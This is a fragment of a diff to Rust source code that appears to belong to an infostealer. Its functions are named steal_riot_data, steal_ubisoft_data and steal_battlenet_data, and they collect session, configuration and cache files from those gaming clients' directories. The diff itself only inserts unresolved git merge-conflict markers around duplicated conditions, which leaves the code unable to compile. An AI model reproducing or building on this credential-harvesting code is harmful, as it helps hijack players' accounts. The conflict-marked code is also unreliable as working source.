@@ -152,10 +152,16 @@ fn steal_riot_data() -> Vec<GamingData> {
                 let file_name = entry.file_name().to_string_lossy().to_string();
 
                 // Buscar archivos de configuración y cache
+<<<<<<< HEAD
                 if file_name.ends_with(".json")
                     || file_name.ends_with(".yaml")
                     || file_name.ends_with(".dat")
                 {
+=======
+                if file_name.ends_with(".json") ||
+                   file_name.ends_with(".yaml") ||
+                   file_name.ends_with(".dat") {
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                     riot_files.push(file_name);
                 }
             }
@@ -267,10 +273,16 @@ fn steal_ubisoft_data() -> Vec<GamingData> {
             let file_name = entry.file_name().to_string_lossy().to_string();
 
             // Buscar archivos de sesión y configuración
+<<<<<<< HEAD
             if file_name.ends_with(".db")
                 || file_name.ends_with(".json")
                 || file_name.ends_with(".ini")
             {
+=======
+            if file_name.ends_with(".db") ||
+               file_name.ends_with(".json") ||
+               file_name.ends_with(".ini") {
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 ubisoft_files.push(file_name);
             }
         }
@@ -311,10 +323,16 @@ fn steal_battlenet_data() -> Vec<GamingData> {
             let file_name = entry.file_name().to_string_lossy().to_string();
 
             // Buscar archivos de configuración y cache
+<<<<<<< HEAD
             if file_name.ends_with(".config")
                 || file_name.ends_with(".db")
                 || file_name == "Battle.net.config"
             {
+=======
+            if file_name.ends_with(".config") ||
+               file_name.ends_with(".db") ||
+               file_name == "Battle.net.config" {
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 battlenet_files.push(file_name);
             }
         }
